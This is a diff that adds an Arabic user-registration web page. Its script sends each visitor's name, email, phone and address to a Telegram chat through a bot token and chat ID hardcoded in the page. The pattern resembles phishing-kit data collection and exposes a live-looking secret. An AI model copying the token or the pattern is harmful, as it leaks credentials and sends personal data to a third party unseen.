@@ -1,0 +1,112 @@
+
+<!DOCTYPE html>
+
+<html dir="rtl" lang="ar">
+<head>
+<meta charset="utf-8"/>
+<title>تسجيل مستخدم جديد - شامترون</title>
+<link href="style.css" rel="stylesheet"/>
+<style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background: #f0f4f7;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .register-container {
+            background: white;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 0 15px rgba(0,0,0,0.1);
+            width: 90%;
+            max-width: 400px;
+            text-align: center;
+        }
+        h2 {
+            color: #003366;
+            margin-bottom: 20px;
+        }
+        input[type="text"],
+        input[type="email"] {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+        }
+        .submit-btn {
+            background-color: #005eb8;
+            color: white;
+            padding: 12px;
+            width: 100%;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 16px;
+            margin-top: 10px;
+        }
+        .submit-btn:hover {
+            background-color: #004b94;
+        }
+    </style>
+</head>
+<body>
+<div class="register-container">
+<h2>تسجيل مستخدم جديد</h2>
+<form>
+<label>الاسم الكامل</label><input placeholder="الاسم الكامل" required="" type="text"/>
+<label>البريد الإلكتروني</label><input placeholder="البريد الإلكتروني" required="" type="email"/>
+<label>رقم الهاتف</label><input placeholder="رقم الهاتف" required="" type="number"/>
+<label>العنوان</label><input placeholder="العنوان" required="" type="text"/>
+
+<div id="successMessage" class="success-alert">✅ تم التسجيل بنجاح! سيتم تحويلك الآن...</div>
+
+<button class="submit-btn" type="submit">تسجيل</button>
+<button class="submit-btn" onclick="window.location.href='convert.html'" type="button">التسجيل كزائر
+    <div style="text-align: center; margin-top: 20px;">
+        <button onclick="history.back()" class="back-button">⬅️ العودة</button>
+    </div>
+</form>
+</div>
+<script>
+document.querySelector("form").addEventListener("submit", function(e) {
+    e.preventDefault();
+
+    const fullName = document.querySelector('input[placeholder="الاسم الكامل"]').value;
+    const email = document.querySelector('input[placeholder="البريد الإلكتروني"]').value;
+    const phone = document.querySelector('input[placeholder="رقم الهاتف"]').value;
+    const address = document.querySelector('input[placeholder="العنوان"]').value;
+
+    const message = `🟢 تسجيل مستخدم جديد:
+👤 الاسم: ${fullName}
+📧 الإيميل: ${email}
+📞 رقم الهاتف: ${phone}
+📍 العنوان: ${address}`;
+
+    const telegramToken = "7441650546:AAEP9_xSxetsw3oQ9-9vrArWQvrC8CxqLaU";
+    const chatId = "361491903";
+
+    fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+            chat_id: chatId,
+            text: message
+        })
+    }).then(response => {
+        if (response.ok) {
+            document.getElementById("successMessage").style.display = "block";
+            setTimeout(() => window.location.href = "convert.html", 1500);
+        } else {
+            alert("حدث خطأ أثناء الإرسال ❌");
+        }
+    }).catch(error => {
+        alert("فشل الاتصال بالخادم ❌");
+    });
+});
+</script>
+  <script src="main.js"></script>
+</body>
+</html>
